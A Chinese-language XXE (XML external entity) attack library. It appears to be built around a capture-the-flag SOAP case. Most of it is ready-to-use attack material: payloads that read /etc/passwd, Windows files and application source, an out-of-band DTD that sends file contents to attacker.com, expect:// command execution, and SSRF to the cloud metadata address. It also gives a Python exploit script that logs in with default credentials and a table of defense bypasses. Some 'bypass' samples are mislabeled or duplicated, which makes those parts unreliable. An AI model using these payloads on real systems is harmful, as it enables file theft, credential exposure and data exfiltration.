# XXE XML外部实体注入 - 攻击库
**Keywords**: XXE, XML External Entity, XML Injection, DTD, XML Parser, File Read, SOAP, OOB XXE

## 1. XXE基础

### XXE漏洞原理

XML外部实体注入（XXE）发生在应用解析XML时，如果启用了外部实体解析，攻击者可以注入恶意实体来读取文件或执行命令。

### 案例032 - SOAP服务XXE

#### 漏洞代码
```python
@app.route('/soap_service', methods=['POST'])
def soap_service():
    xml_data = request.data
    try:
        parser = etree.XMLParser(resolve_entities=True)  # ← 启用外部实体解析
        root = etree.fromstring(xml_data, parser)
```

#### 基础XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
```

#### 攻击步骤

```bash
# 1. 使用默认凭据登录（john/password123）
curl -X POST "http://target/login" \
  -d "username=john&password=password123" \
  -c cookies.txt

# 2. 发送XXE payload读取flag
curl -X POST "http://target/soap_service" \
  -H "Content-Type: application/xml" \
  -b cookies.txt \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'
```

## 2. XXE攻击类型

### 2.1 文件读取

```xml
<!-- 读取Linux文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>

<!-- 读取Windows文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<document>&xxe;</document>

<!-- 读取应用配置文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/config.php">
]>
<document>&xxe;</document>

<!-- 读取源代码 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/app.py">
]>
<document>&xxe;</document>
```

### 2.2 带外数据提取 (OOB)

当直接读取文件失败时，使用OOB技术通过DNS或HTTP请求窃取数据：

```xml
<!-- 外部DTD文件 (在attacker.com服务器上) -->
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- 目标服务器的payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<document></document>
```

### 2.3 盲XXE (Blind XXE)

当无法直接看到输出时，使用时间延迟检测：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>
  <test>&xxe;</test>
</document>

<!-- 配合sleep检测 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://sleep 5">
]>
<document>&xxe;</document>
```

### 2.4 XXE导致的SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<document>&xxe;</document>
```

## 3. XXE绕过技巧

### 绕过1: 编码绕过

```xml
<!-- HTML编码 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>

<!-- Base64编码实体名 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY &#x78;&#x78;&#x65; SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

### 绕过2: 多重编码

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

### 绕过3: 特殊协议

```xml
<!-- PHP filter -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<document>&xxe;</document>

<!-- expect协议 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<document>&xxe;</document>

<!-- zip协议 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "zip://archive.zip#/path/to/file">
]>
<document>&xxe;</document>
```

## 4. XXE Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import re
from urllib.parse import urljoin

def xxe_exploit(target_url, file_path="/etc/passwd"):
    """
    利用XXE漏洞读取文件
    """
    
    # 构造XXE payload
    xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'''
    
    print(f"[*] 目标: {target_url}")
    print(f"[*] 读取文件: {file_path}\n")
    
    session = requests.Session()
    
    # 步骤1: 登录（如果需要）
    login_url = urljoin(target_url, "/login")
    login_data = {"username": "john", "password": "password123"}
    
    print(f"[*] 步骤1: 登录...")
    r = session.post(login_url, data=login_data)
    
    if r.status_code == 200:
        print(f"[+] 登录成功\n")
    
    # 步骤2: 发送XXE payload
    soap_url = urljoin(target_url, "/soap_service")
    headers = {'Content-Type': 'application/xml'}
    
    print(f"[*] 步骤2: 发送XXE payload...")
    r = session.post(soap_url, data=xxe_payload, headers=headers)
    
    print(f"[+] 响应状态: {r.status_code}\n")
    print(f"[+] 响应内容:")
    print(r.text)
    
    return r.text

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        print(f"示例: {sys.argv[0]} http://target")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print("="*60)
    print("案例032 XXE漏洞利用脚本")
    print("="*60 + "\n")
    
    xxe_exploit(target, "/app/flag.txt")
```

## 5. XXE防御绕过总结

| 防御方式 | 绕过方法 |
|---------|---------|
| 禁用外部实体 | 使用OOB（带外数据提取） |
| 黑名单协议 | 使用其他协议（expect://、zip://等） |
| 过滤DOCTYPE | 使用不同的XML格式 |
| 禁用SYSTEM | 使用PUBLIC关键字 |
| 防火墙过滤 | 使用DNS隧道或时间延迟 |


## 场景补充

### 场景1: 基础XXE文件读取
```bash
curl -X POST "http://target/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'
```

### 场景2: XXE读取flag
```bash
curl -X POST "http://target/soap_service" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'
```

### 场景3: XXE OOB数据外带
```bash
# 攻击者服务器上的xxe.dtd
cat > xxe.dtd << 'DTD'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
DTD

# 发送XXE payload
curl -X POST "http://target/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]>
<root></root>'
```

### 场景4: XXE导致SSRF
```bash
curl -X POST "http://target/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>'
```
